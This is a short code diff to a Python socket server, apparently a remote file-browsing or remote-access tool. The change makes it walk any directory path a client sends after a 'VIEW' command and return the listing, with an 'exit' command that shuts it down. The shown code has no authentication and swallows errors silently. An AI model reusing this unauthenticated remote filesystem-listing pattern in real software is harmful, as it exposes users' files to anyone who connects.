@@ -105,11 +105,20 @@ def server():
                     '''
                     
                 
+
                 if data:
+                    action = None
+                    try:
+                        payload = data.decode("utf-8").split("~~")
+                        action = payload[0]
+                        URI = payload[1]
+                    except Exception as e:
+                        pass
+
                     if data.decode('utf-8') == "exit":
                         sys.exit()
-                    if data.decode("utf-8") == "view":
-                        new_data = str(walk_folder("C:\\")).encode("utf-8")
+                    if action is not None and action == "VIEW":
+                        new_data = str(walk_folder(URI)).encode("utf-8")
                         conn.sendall(new_data)
                 conn, addr = s.accept() #accept next connection
                 
